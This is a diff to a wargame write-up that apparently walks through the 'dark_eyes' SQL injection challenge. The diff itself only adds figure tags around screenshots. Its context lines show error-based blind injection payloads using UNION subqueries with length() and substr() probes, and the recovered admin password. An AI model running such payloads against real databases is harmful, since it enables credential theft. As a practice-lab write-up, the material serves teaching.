@@ -3,7 +3,9 @@ custom_edit_url: null
 sidebar_position: 22
 ---
 
+<figure style={{ textAlign: 'center' }}>
 ![1](https://github.com/Kunull/Write-ups/assets/110326359/cbd65f64-4c89-44f4-b041-b362993f22dd)
+</figure>
 
 We are provided with the SQL query:
 
@@ -56,7 +58,9 @@ SELECT id FROM prob_dark_eyes WHERE id='admin' AND pw='' OR (SELECT 1 UNI
 
 The above SQL query includes the subquery `(SELECT 1 UNION SELECT 2 where id='admin' and length(pw)=1)` which returns two values if the `length(pw)=1` for `id='admin'`. This would invoke an error and cause the challenge to exit.
 
+<figure style={{ textAlign: 'center' }}>
 ![2](https://github.com/Kunull/Write-ups/assets/110326359/29f2c0b3-d400-4043-8ce0-5a0c461edf1d)
+</figure>
 
 Since the challenge did not exit, it means that the subquery only returned one value `SELECT 1`. This tells us that the length of the `pw` for `id='admin'` is more than 1.
 
@@ -72,7 +76,9 @@ The resultant query becomes:
 SELECT id FROM prob_dark_eyes WHERE id='admin' AND pw='' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND length(pw)=8) -- -'
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![3](https://github.com/Kunull/Write-ups/assets/110326359/fc84a7c5-6e2b-48c9-98e0-3c568896f8ed)
+</figure>
 
 The subquery returned two values `SELECT 1 UNION SELECT 2` because the length of `pw` for `id='admin'` is 8. This caused an error, causing the challenge to exit.
 
@@ -94,7 +100,9 @@ The resultant query will be:
 SELECT id FROM prob_dark_eyes WHERE id='admin' AND pw='' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND substr(pw, 1, 1)='0') -- -'
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![4](https://github.com/Kunull/Write-ups/assets/110326359/9b457365-e10b-441b-8118-a7b79af680c8)
+</figure>
 
 Since the challenge did not exit, it means that the subquery only returned one value `SELECT 1`. This tells us that the first character of the `pw` for `id='admin'` is not `0`.
 
@@ -110,7 +118,9 @@ The resultant query will be:
 SELECT id FROM prob_dark_eyes WHERE id='admin' AND pw='' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND substr(pw, 1, 1)='5') -- -'
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![5](https://github.com/Kunull/Write-ups/assets/110326359/e62cdc7f-f0c7-4e9e-9177-e345970208a6)
+</figure>
 
 The subquery returned two values `SELECT 1 UNION SELECT 2` because the first character of `pw` for `id='admin'` is ``5`. This caused an error, causing the challenge to exit.
 
@@ -227,4 +237,6 @@ The resultant query becomes:
 SELECT id FROM prob_dark_eyes WHERE id='admin' AND pw='5a2f5d3c'
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![6](https://github.com/Kunull/Write-ups/assets/110326359/e6a9c9b4-8d34-4c6a-9bf4-3a9538a4cb5d)
+</figure>
